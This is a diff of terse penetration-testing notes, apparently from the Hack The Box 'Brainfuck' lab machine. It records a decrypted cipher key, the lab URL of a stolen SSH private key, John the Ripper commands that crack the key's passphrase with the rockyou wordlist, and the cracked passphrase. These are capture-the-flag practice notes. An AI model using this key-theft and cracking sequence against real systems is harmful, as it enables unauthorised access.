@@ -1,0 +1,11 @@
+PT: Orestis - Hacking for fun and profit
+EN: Pieagnm - Jkoijeg nbw zwx mle grwsnn
+KY: Brainfu - Ckmybra inf uck myb rainfu   (rumkin.com/tools/cipher.otp.php)
+use passphrase fuckmybrain to decrpt any message http://rumkin.com/tools/cipher/vigenere-keyed.php
+
+https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
+
+root@kali:/opt/tools/john# ./sshng2john.py ~/myoscpbook/htb/brainfuck/id_rsa > /root/myoscpbook/htb/brainfuck/brainfuck-crack 
+
+root@kali:/opt/tools/john# john /root/myoscpbook/htb/brainfuck/brainfuck-crack -wordlist=/opt/wordlist/rockyou.txt
+3poulakia!
